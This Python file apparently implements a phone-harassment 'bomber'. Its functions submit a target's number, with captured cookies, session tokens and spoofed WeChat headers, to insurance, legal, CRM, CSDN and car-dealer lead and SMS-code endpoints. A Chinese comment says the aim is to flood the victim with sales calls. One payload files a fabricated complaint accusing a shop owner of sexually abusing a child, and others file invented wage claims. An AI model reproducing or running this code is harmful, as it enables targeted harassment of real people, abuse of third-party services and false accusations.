from flask import Flask, request, jsonify
import requests
import threading
import resource_1

app = Flask(__name__)

# 存储轮询任务的状态
tasks = {}
#接口的电话效果是把手机号填入接口，然后会有客服电话过来买保险➕法律➕精神病院预约，并且不一定刚运行就有人打电话过来，挖过接口的都知道，被骚扰的痛/qq活不下去了😭

import requests
import base64
import json
import time
from urllib.parse import quote

def base64_encode(text):
    return base64.b64encode(text.encode('utf-8')).decode('utf-8')

def send_to_dxmbaoxian(mobile):
    url = "https://www.dxmbaoxian.com/juhe/insurface/consultant/sendVerificationCode"
    cookies = {
        "MASTATE": "5SlGnVKFtSMEHBWE%2BY3emiu0ItEGdAqcf0JXKs4y6TsuDe%2BcqGcB5wk-p%3D%2Bl7ba4p9lS70Gk7Qb8CRRs5TlMG0gBa-X2qghW0ZnSqIYAt1j4pbiPn",
        "DXMBXID": "DXMBXID8aad768c-ae20-4086-bbf4-3947cff1c214",
        "LOG_CHANNEL_ID": "dxmjr_H5-shouye-dakapian1",
        "LOG_SESSION_ID": "a0aa3c64-3e5a-4821-8c77-17473b0739a4-1754372069495",
        "ISEE_DEVICE_ID_V2": "2ab07d1621f620b1c62826f788179a94",
        "ISEE_BIZ": "11210039Kcue4BD2X_skkAPW48fHg7Q.T",
        "11210039Kcue4BD2X_skkAPW48fHg7Q": "1754372070793",
        "ISEE_COUNT": "1102",
    }
    headers = {
        "Host": "www.dxmbaoxian.com",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "\"Android\"",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxdde36ae788f0bd5c",
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
        "Content-Type": "application/json;charset=UTF-8",
        "sec-ch-ua-mobile": "?1",
        "Origin": "https://www.dxmbaoxian.com",
        "X-Requested-With": "com.tencent.mm",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.dxmbaoxian.com/s/product?itemId=2000000356&channelId=dxmjr_H5-shouye-dakapian1&sourceChannel=shareMSG_wx-service-xiaochengxu-1005",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    data = json.dumps({
        "from": "36",
        "tagId": "",
        "channelId": "dxmjr_H5-shouye-dakapian1",
        "sourceChannel": "shareMSG_wx-service-xiaochengxu-1005",
        "timestamp": 29239535,
        "wxAccessCode": None,
        "sessionId": "a0aa3c64-3e5a-4821-8c77-17473b0739a4-1754372069495",
        "errTimes": 0,
        "syncStokenTime": 0,
        "currentSyncTimes": 0,
        "did": None,
        "phone": mobile
    })
    return requests.post(url, headers=headers, cookies=cookies, data=data)

def send_to_zhongmin(mobile):
    url = "https://m.zhongmin.cn/Topic/AddYuyueNew"
    cookies = {
        "ASP.NET_SessionId": "xbg1wz02h2ebhydki1uwcpdg",
        "cookieUserName": "cookie0F4D39BF5852DA4D2376B66403A635D9",
        "areaCodeOut": "Code%3D",
        "Hm_lvt_6c7f533b7cc67b6f40de81580fec468e": "1754308837",
        "HMACCOUNT": "28B89CEFEC2F563F",
        "userId": "14808934",
        "tokenZM": "57315b3f242c460cb55c76402220baa0",
        "referrer": "",
        "UVTOKEN": "M7c786431bbe94da89ffa67683c4df869",
        "miniprogram": "1",
        "Hm_lpvt_6c7f533b7cc67b6f40de81580fec468e": "1754373078",
        "areaCode": "HMBGDW04202",
        "isFirstLogin": "true",
    }
    headers = {
        "Host": "m.zhongmin.cn",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "\"Android\"",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxf6715f305a746068",
        "Accept": "*/*",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "sec-ch-ua-mobile": "?1",
        "Origin": "https://m.zhongmin.cn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://m.zhongmin.cn/benefitGuarantee/Index?&miniprogram=1&isarticle=0&miniphone=&cityid=&openid=o_-GO4k4GF7wKK1edUGK-e3YKxtI&areaCode=",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    data = f"name=%E6%95%91%E8%B5%8E&phone={mobile}&sex=0&type=1306&des=%E6%83%A0%E6%B0%91%E4%BF%9D%E9%9A%9C%E9%A2%84%E7%BA%A6"
    return requests.post(url, headers=headers, cookies=cookies, data=data)

def send_to_xiaoyusan(mobile):
    url = "https://www.xiaoyusan.com/Phonecrm/createOuterActNoLogin"
    cookies = {
        "acw_tc": "0a0011e917543779705586941e5a05034d5f35d8fc1bf2cbdaaf1ab34504fe",
        "PHPSESSID": "d593e37a75386f616c013f451ad09d58",
        "touchurl": "http%3A%2F%2Fwww.xiaoyusan.com%2Factivity%2FbasicActActionV2%2FgetActUserInfo",
        "_xys_fd_id": "d593e37a75386f616c013f451ad09d58",
        "_xys_s_id": "xbehat7atj7m0u3ry1f8605fwkqs1qwb",
        "Hm_lvt_8dd2422e78fa31be4e5f5469ebe50589": "1754377971",
        "Hm_lpvt_8dd2422e78fa31be4e5f5469ebe50589": "1754377971",
        "HMACCOUNT": "28B89CEFEC2F563F",
        "_ga": "GA1.2.1558367497.1754377974",
        "_gid": "GA1.2.1201782440.1754377974",
        "_gat_gtag_UA_118701918_1": "1",
        "SERVERID": "0eb4557f6237e94d9e97f8fbc080f699|1754377978|1754377970",
        "SERVERCORSID": "0eb4557f6237e94d9e97f8fbc080f699|1754377978|1754377970",
    }
    headers = {
        "Host": "www.xiaoyusan.com",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "\"Android\"",
        "X-Requested-Sh-Traceid": "936e759279edc705dfdf4c3dab890cec",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
        "sec-ch-ua-mobile": "?1",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.xiaoyusan.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.xiaoyusan.com/shk/wkpage/index/38376d_2023000830.1.html?eva=2023000830&chn=mlxm-gzh-jbpyl-xxsj-zhengweiqiang-1v1zx-h5-xys-01-cp-008&wkpushstate=1754377971445",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    data = f"chn=mlxm-gzh-jbpyl-xxsj-zhengweiqiang-1v1zx-h5-xys-01-cp-008&eva=2023000830&name=%E6%95%91%E8%B5%8E&mobile={mobile}&cbs=&biztype=&act_name=cal_insure_no_verify&outer_act_link=https%3A%2F%2Fwww.xiaoyusan.com%2Fshk%2Fwkpage%2Findex%2F38376d_2023000830.1.html%3Feva%3D2023000830%26chn%3Dmlxm-gzh-jbpyl-xxsj-zhengweiqiang-1v1zx-h5-xys-01-cp-008%26wkpushstate%3D1754377971445&remark=%E4%B8%BA%E8%B0%81%E5%AE%9A%E5%88%B6%EF%BC%9A%E8%87%AA%E5%B7%B1%2C%E8%B4%AD%E4%B9%B0%E9%99%A9%E7%A7%8D%EF%BC%9A%E9%87%8D%E7%96%BE%E9%99%A9"
    return requests.post(url, headers=headers, cookies=cookies, data=data)

def send_to_mikecrm(mobile):

    url = "http://cn.mikecrm.com/handler/web/form_runtime/handleSubmit.php"
    cookies = {
        "uvi": "ERwqUZwjB1eLSXL58Ge9IHiTwzh7omkFegjCa77HG0ErxL9BsVLElvLqYLPmgOoz",
        "mk_seed": "84",
    }
    headers = {
        "Host": "cn.mikecrm.com",
        "Connection": "keep-alive",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "http://cn.mikecrm.com",
        "Referer": "http://cn.mikecrm.com/ozURs1",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }

    encoded_mobile = base64_encode(mobile)

    data = {
        "d": json.dumps({
            "cvs": {
                "i": 631193,
                "t": "ozURs1",
                "s": 378999,
                "acc": "orWXs2vrRcVP9pfzZH1ppaL2uMsKvJZR",
                "r": "",
                "c": {
                    "cp": {
                        "733857": "救赎抓包666",
                        "733858": {"n": "救赎"},
                        "733859": "国安",
                        "733860": [encoded_mobile],
                        "733861": "50",
                        "733862": [616686, 616685, 616684, 616683, 616682]
                    },
                    "ext": {"uvd": [733857, 733858, 733859, 733860]}
                }
            }
        })
    }

    data_str = "d=" + quote(json.dumps(data["d"]))
    return requests.post(url, headers=headers, cookies=cookies, data=data_str)

def send_to_szjhjt(mobile):

    url = "https://msg.szjhjt.com/main/msg/leave"
    headers = {
        "Host": "msg.szjhjt.com",
        "Connection": "keep-alive",
        "token": "",
        "content-type": "application/json",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wx3b723cd4634f5ef2/2/page-frame.html",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = json.dumps({
        "name": "救赎",
        "phoneText": mobile,
        "type": "ali",
        "appid": "wx3b723cd4634f5ef2",
        "news_text": "拖欠工资",
        "select_as_name": "1千-1万",
        "text_content": "黑心救赎小卖部这个店坑了我女儿无效3500元，还让我女儿给他摸隐私部位才能还他，要不是我女儿我都不知道有这回事"
    })
    return requests.post(url, headers=headers, data=data)

def send_to_qixin(mobile):

    url = "https://cps.qixin18.com/v3/m/api/common/sendReservatSmsCode?md=0.4350888810127329"
    cookies = {
        "nodejs_sid": "s%3AJe330pDnPvmMafrtsgLGXZubqQg7Plv7.FB9kbFV89DrYQBJkYRb0UkaPNwzEQm5Trgd0yUlseOk",
        "fed-env": "production",
        "_qxc_token_": "eb81b40d-43f9-4bcf-8b57-bd165da4fad7",
        "hz_guest_key": "3x9a97LHUHZ4y3XPekPH_1754097046804_1_1015544_38625430",
        "_bl_uid": "j5mjkd0XtbvkC138scUCkhstU8yy",
        "merakApiSessionId": "ebb083327198781a0976uqPJu53NwsTZ",
        "MERAK_DEVICE_ID": "54826bc105b8826c0935c7ef9cb76101",
        "MERAK_RECALL_ID": "98b083327198781a0b76EQOm7F0i9Itv",
        "MERAK_SESSIONID_ID": "0ab083327198781a0b77ccweQE49Inxl",
        "token": "4de2157f-751a-4fef-9629-56be19d9366c",
        "acw_tc": "ac11000117543930671605244e17564aa24627b1ad4373f6c54dee62ac49a4",
        "beidou_mini_cross_state": "%7B%22_beidouWxDistinctId%22%3A%221754393057537-3919538-085c85ad06848e-55739345%22%2C%22_beidouWxLoginId%22%3A%22%22%7D",
        "beidou_jssdk_session_id": "1754393069461-7502498-0eb149ad9e396b8-95476587",
        "beidoudata2015jssdkcross": "%7B%22distinct_id%22%3A%221754393057537-3919538-085c85ad06848e-55739345%22%2C%22first_id%22%3A%221986854db025b8-049c104f343d668-622e2a12-430320-1986854db03495%22%2C%22props%22%3A%7B%22%24search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22session_id%22%3A%22%22%2C%22%24page_visit_id%22%3A%221754393057537-3919538-085c85ad06848e-55739345-1754393069466%22%2C%22%24device_id%22%3A%221986854db025b8-049c104f343d668-622e2a12-430320-1986854db03495%22%2C%22sdk_injection%22%3A%22INJECTED%22%2C%22login_id%22%3A%22%22%2C%22login_Id%22%3A%22%22%7D",
        "MERAK_ENTER_PAGE_TIME": "1754393069682",
        "tfstk": "g2om8HgG-vC00-sfodqXlxXJRhgMkoZ_UfIT6lFwz7PSD5FxQl-ihj4T3Gkasfc8NrF2llHa_7l_6iE25OugBRWV7GPVabDsBSnTHIwZZXGhXKgx6tgS9vSxDEZOjoZTbBdpvHBjhlZwz2sbHsNzIJtObSPacurhifEBvHHj3nDCGFxKXld0aRFabrz4UuP7I15q_rzPz7w_QsyN0LDzN7yN7-rw48ybp5PZ_lJoU7wab5lauLDzNRra_QcPuSN4M0Ri_aAKquQK2-40TxPqUXnzB6et37SOQ4y0otH4ZGSZ4VxVqnNw46Vs4fqUo0JOSWq7ZR2mmdQQ12eiQJqFpGkogbo380d5X5Szoa7EgnS_93D15Na4F8Vdpza-0R2e7OJkEwW_u8wr2Lvl5Na4F8VpELb3hry7U0C..",
    }
    headers = {
        "Host": "cps.qixin18.com",
        "Connection": "keep-alive",
        "traceparent": "00-ec6e919fb633d89b0cfe89478947868c-600925b4aada7870-01",
        "sec-ch-ua-platform": "\"Android\"",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 miniProgram/wxe186f230ce102b30",
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
        "Content-Type": "application/json;charset=UTF-8",
        "sec-ch-ua-mobile": "?1",
        "Origin": "https://cps.qixin18.com",
        "X-Requested-With": "com.tencent.mm",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://cps.qixin18.com/m/apps/cps/bxn1096837/product/detail?prodId=104994&planId=130301&tenantId=0&createTime=1737170298565&beidouWxDistinctId=1754393057537-3919538-085c85ad06848e-55739345&beidouWxLoginId=",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    data = json.dumps({
        "telephone": mobile,
        "nvcData": "%7B%22a%22%3A%22FFFF000000000176F978%22%2C%22c%22%3A%221754393074418%3A0.11043106819183113%22%2C%22d%22%3A%22nvc_message_h5%22%2C%22h%22%3A%7B%22key1%22%3A%22code0%22%2C%22nvcCode%22%3A400%2C%22umidToken%22%3A%22T2gAS31uagM2X-E0z2j2JuoQ9YfSR0ti-jqcPAZIthsx8iZBAl1Z7vDTZfx5_2e30Ok%3D%22%7D%2C%22j%22%3A%7B%22test%22%3A1%7D%2C%22b%22%3A%22140%23j5ToaOeezzPXyQo2FxBQA3SoYtkr1PCOldd96z9Jk1L06PJD5Csanhp61jGBhxAOoVmS%2FihPGjWXxp1L25stjOCDyzldmtrj7u2yz%2BDQzPgflp1zzXE62m9NBQzxOmHK9pJjzzrb22U3l61x0b2IV2VjUQDa2DcR0uG8zbzeP183l6TzDDrbnxEl6gfa2Pc3Vtg2zFzB2ws9lUWLz8riE2h%2F8brzHs83K3JjzFzb2LDZlQ5xOPFbciCqlQzz2nH%2BV31QFQzXHO83l6TzH8rb8Og%2FxF%2Bx2PD3VtCfzxfS2dAWl3MzzDxiVOGl3lbzzyc4Vpg%2FzdrI2osYPfSzMrMiV2E%2FlMTx2Pp%2BN3lqoF%2B4211WlplJzPKvV2TcxQ4d2P4JhoMTzTbi2U5pl4Qo5fzI2z6HkHmijDapVrMn%2F2I4jearIkM%2BIXKnqdqAtmQLHluyyuI%2FLigLnFwu90YKzhKsb4MDX2%2Fj3fxaTvyx2GBaAp5hxz5FTZvsc5b9yd3BvpPfvycy8%2BU8kSOYW1Pu0POhXQZtYobTZuDZ6%2FhIWU2ok8qzwNyRoBa7J0%2F5uBUFxw5aUEzMw%2FHintdyKouRJHkIIDm9e6uDyY6hgi%2BmDMY%2BDxS03%2F6TRMqlrLnIKxrYLShpPGwIbvhA7bssFKsXax2qHT8RFT8QieM55h3b5be%2FYoEHt0XcJzgvBtq5JGRo8DD1lUjpOlxOkZU3N78niCXLo8VlzZaxVXRCuOcKqiNLCMG%2F5sd9MOt3ChJC36pNbGoKkxCGNduPxPqZXFyHJSfsebfJICy%2BbT1xqiIJacOtbd4%2FWF6o2JgslXqz3Dc3Kp1zilUb2d2ZioK5KDnJP5bHcLtXNxRVR%2BrR4Msg8v82no70sAg2O3qjfuqW3LFamluYz47%2BjwWU82KW5ucAUQtcsIm436iZ3%2F1%2B4Xc%2FvBJ3ngE3%2FtH6SWNjM5k4wKuYLhCgUgmqDB1z3LUcVMDwNYGD0zDSZrdyVY3jraUa4X4A2hbU0dVLcQm2LCy9OuQtFpV9S0wu6pSgtx8JN41%3D%22%2C%22e%22%3A%22cbFWvt9kexwpfxCybnUZIeRXz45AI-bGe58D_qNbcmaHrS9W8frU1RtVpWNk_x6OKmDiaOmCDj54dYR_DJ9RspqEIDdNHNK5HUMU627XqqmfOR8E5TFJv32bOkU5rsK0uL94kY14W-TIhbX0kuKFAPh88DLPh6d509g_3Yca4XtnK9A4GT4Z9fixZrARvDomK9ichTMCJ4brC9lV3KiLNhZwuR_Njcgb3lv1fLasHEj3mIXbaXIS8qXt8wPlkyGQqBQtPXt9KBZtGtiogryxFUug5sRl8IKnUhzHY1aq4lbgL_dJz7qe5eBpCK0VEI0X0TZk9CYUEg01YTuvCMKFMuIknevhmPdD8bHW918-lSpCiNImoKrKVCuZjzOta_aLZ6AvmqZYXV2p-2jwyK3k5-MAVa2XVLqq6mUb2LMtaCGzFnEPsho4Dj5ALMo32aVsOoLGymA9GsWPL4xkgVjHZ-Ll5Zvf59cs6ikTIPkaRQ0%22%2C%22i%22%3Atrue%7D"
    })
    return requests.post(url, headers=headers, cookies=cookies, data=data)

def send_to_taikang(mobile):

    url = "https://checkreport.taikanglife.com/contact-xyw/clue/clueNotifyTikTalk"
    cookies = {
        "sajssdk_2015_cross_new_user": "1",
        "sensorsdata2015jssdkcross": "%7B%22distinct_id%22%3A%221987a1499f96a-04a55435a87d4bc-6d275d66-430320-1987a1499fa359%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTk4N2ExNDk5Zjk2YS0wNGE1NTQzNWE4N2Q0YmMtNmQyNzVkNjYtNDMwMzIwLTE5ODdhMTQ5OWZhMzU5In0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%7D",
    }
    headers = {
        "Host": "checkreport.taikanglife.com",
        "Connection": "keep-alive",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "http://checkreport.taikanglife.com",
        "X-Requested-With": "com.tencent.mm",
        "Referer": "http://checkreport.taikanglife.com/o2oweb/?entrance=%E9%9B%86%E5%9B%A2%E5%AE%98%E7%BD%91%E7%A7%BB%E5%8A%A8%E7%AB%AF",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    data = json.dumps({
        "name": "救赎",
        "phone": mobile,
        "yq": "哈尔滨龙园",
        "source": "集团官网移动端",
        "createTime": "2025-08-05 19:54:02",
        "ageType": "N",
        "yzcode": ""
    })
    return requests.post(url, headers=headers, cookies=cookies, data=data)

def send_to_szjhjt2(mobile):

    url = "https://msg.szjhjt.com/main/msg/leave"
    headers = {
        "Host": "msg.szjhjt.com",
        "Connection": "keep-alive",
        "token": "",
        "content-type": "application/json",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wx3b723cd4634f5ef2/2/page-frame.html",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = json.dumps({
        "name": "张山",
        "phoneText": mobile,
        "type": "ali",
        "appid": "wx3b723cd4634f5ef2",
        "news_text": "劳动纠纷",
        "select_as_name": "1万-5万",
        "text_content": "黑心老板张总，拖欠我3万工资"
    })
    return requests.post(url, headers=headers, data=data)

def send_to_law(mobile):

    url = "https://law.q1s.cn/api/common/sendSms"
    headers = {
        "Host": "law.q1s.cn",
        "Connection": "keep-alive",
        "content-type": "application/json",
        "Authorization": "Bearer 1277120|WhPbSTqvm9o4rlDdR6VdykrC17jrbVKCgl4rH84uc7a88391",
        "Version": "5",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wx000a21741b87cbdb/7/page-frame.html",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = json.dumps({"type": "submit", "mobile": mobile})
    return requests.post(url, headers=headers, data=data)

def send_to_csdn(mobile):

    url = "https://passport.csdn.net/v1/login/wap/sendWAPVerifyCode"
    cookies = {
        "uuid_tt_dd": "10_28714558530-1754396937186-188281",
        "dc_session_id": "10_1754396937186.835610",
        "dc_sid": "dbda29b6b75e004a5a8071a64e4d5f9d",
        "c_pref": "default",
        "fid": "20_00742136428-1754396938319-056890",
        "c_first_ref": "default",
        "c_first_page": "https%3A//mall.csdn.net/pages/item/detail%3FskuId%3D76785",
        "c_dsid": "11_1754396938338.116154",
        "c_segment": "9",
        "c_page_id": "default",
        "https_waf_cookie": "6bacf876-da18-498055d9c15764f8b4f9230f5a1942503a63",
        "SESSION": "be80a4a9-7b41-4a98-bc32-909c2fcd2962",
        "bc_bot_session": "175439694272a3eb359a2b2924",
        "waf_captcha_marker": "a7f9bb427ea18933a037bc96ab01f541fa351171dec615e6c223efaed6ce2fd4",
        "Hm_lvt_6bcd52f51e9b3dce32bec4a3997715ac": "1754396944",
        "Hm_lpvt_6bcd52f51e9b3dce32bec4a3997715ac": "1754396944",
        "HMACCOUNT": "28B89CEFEC2F563F",
        "c_ref": "https%3A//mall.csdn.net/",
        "log_Id_pv": "2",
        "c-login-auto": "1",
        "bc_bot_token": "100175439694272a3eb359a2b292423ed5f",
        "bc_bot_rules": "-",
        "bc_bot_fp": "c9a1d7cb26edd8bf7884ddf9eb958ca8",
        "log_Id_view": "1",
        "dc_tos": "t0itch",
        "tfstk": "gfannzqkmSpHkILBx_0CAWLz6erkd2gSE8L-e4HPbAkse6MKp7yuZSozJvB7ql2gnUHEpkpuqSyoe8V5ObkzU8D8vGITOWgSztelkZFQsT77fJDEUh5rZjKP6D8Tw1RZztBAWQG40q3zefx9K5PZCbceUXyy7AksiBurL0JwbjkZU4yyYFJZGb8y4UoFs5ksZXurz8PNsbHZU4uzU5RJM9HLTWaNE8iPqD38cPcnxxPNqeTL5Eni3WD6wdzitKM4TAYyyxXeUjP0E9YjTzc3oDq1FeNISVymbl6DRYnuSJqoAILxbPPU8DaRIUSPYh-4Lw8SHNVWV3iE1fDvzlhKXLREJg5GsnkmYfGNX1fMV3iE1fDAs1x4jDls_GC..",
    }
    headers = {
        "Host": "passport.csdn.net",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
        "X-Tingyun-Id": "im-pGljNfnc;r=396955646",
        "sec-ch-ua-mobile": "?1",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "https://passport.csdn.net",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://passport.csdn.net/signwap",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    data = json.dumps({"mobile": mobile, "code": "0086", "type": "0"})
    return requests.post(url, headers=headers, cookies=cookies, data=data)

def send_to_lynkco(mobile):

    url = "https://h5-api.lynkco.com/wx-miniprogram/miniProgramDriveRecord/addReserveRecord"
    headers = {
        "Host": "h5-api.lynkco.com",
        "Connection": "keep-alive",
        "content-type": "application/json",
        "token": "5b8a7132-c501-4df0-8397-1b2a9bf44718",
        "X-Ca-Key": "204644386",
        "X-Ca-Nonce": "3e4e74b0-d6e1-47c2-b92f-6627b86edf4f",
        "X-Ca-Signature-Method": "HmacSHA256",
        "X-Ca-Timestamp": "1754397030598",
        "X-Ca-Signature-Headers": "X-Ca-Key,X-Ca-Timestamp,X-Ca-Nonce,X-Ca-Signature-Method",
        "X-Ca-Signature": "D3+hObHeiPnbzUIAh2w05av8QxYadV44SvXWjx4NFK8=",
        "Accept": "*/*",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wx4e8c1172fe132106/164/page-frame.html",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = json.dumps({
        "date": "2025-08-06T12:30:30.597Z",
        "dealerCode": "101556",
        "mobile": mobile,
        "seriesCode": "414"
    })
    return requests.post(url, headers=headers, data=data)

